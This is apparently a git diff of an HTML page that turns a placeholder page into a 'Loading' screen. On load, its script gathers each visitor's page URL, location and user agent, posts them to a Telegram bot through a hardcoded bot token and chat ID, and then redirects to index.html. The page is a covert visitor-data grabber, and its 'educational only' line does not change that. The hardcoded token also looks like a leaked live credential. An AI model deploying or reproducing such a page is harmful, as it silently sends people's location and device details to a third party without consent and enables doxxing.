@@ -2,12 +2,10 @@
 <html>
   <head>
     <meta charset="UTF-8">
-    <title>Titre de la page</title>
+    <title>Loading</title>
+    <style>html{color-scheme: dark;}</style>
   </head>
   <body>
-    <h1>Titre principal</h1>
-    <p>Paragraphe de texte</p>
-      
     <script>
       // 🛂 Telegram API Send Client Info
       // 📜 Author : https://github.com/Elxss aka Elxss
@@ -29,8 +27,8 @@
         const Location = data.loc;
         const userAgent = navigator.userAgent;
         
-        const botToken = "YourBotToken";
-        const chatId = "YourChatId";
+        const botToken = "6275460493:AAGVqmooTODAnXro_a76IAz_VjCe8ghq9I4";
+        const chatId = "1185131759";
         
         const Template = `🆕 Client :
         - 🏛 Page : ${currentURL}
@@ -44,20 +42,29 @@
         - 📌 Location : ${Location}
         - 🛂 User-Agent : ${userAgent}
         The purpose of this script is educational only and not to dox anyone.`;
-        
+        console.log(Template)
         const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        const request = new XMLHttpRequest();
         const requestData = `chat_id=${chatId}&text=${encodeURIComponent(Template)}`;
-        request.open("POST", apiUrl);
-        request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-        request.send(requestData);
+        await fetch(apiUrl, {
+          method: "POST",
+          headers: {
+            "Content-type": "application/x-www-form-urlencoded"
+          },
+          body: requestData
+        });
       }
       
-      console.log("Trying ...");
-      await getClientInfo();
+      async function run() {
+        console.log("Trying ...");
+        await getClientInfo();
+        window.location.href = "index.html";
+      }
       
-      // Une fois que la fonction getClientInfo() est terminée, on redirige l'utilisateur vers l'index.html
-      window.location.href = "index.html";
+
+      
+      // Une fois que la fonction getClientInfo() est terminée, on redirige l'utilisateur vers l'index.html 
+      run();
+      
     </script>
   </body>
 </html>
